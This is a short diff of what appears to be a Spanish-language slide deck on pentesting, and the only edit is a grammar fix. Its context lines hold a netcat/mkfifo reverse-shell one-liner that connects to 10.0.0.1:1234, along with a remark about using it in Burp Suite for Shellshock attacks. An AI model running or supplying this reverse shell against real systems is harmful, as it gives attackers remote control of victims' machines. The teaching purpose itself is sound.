@@ -40,7 +40,7 @@ paginate: true
 └──╼ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 ### Ejemplo de uso
-En burpsuite se podrían ocupar en ataques como Shellshock, por ejemplo:
+En burpsuite se podría ocupar en ataques como Shellshock, por ejemplo:
 ```
 #Se ocupa como base un proceso como este...
 
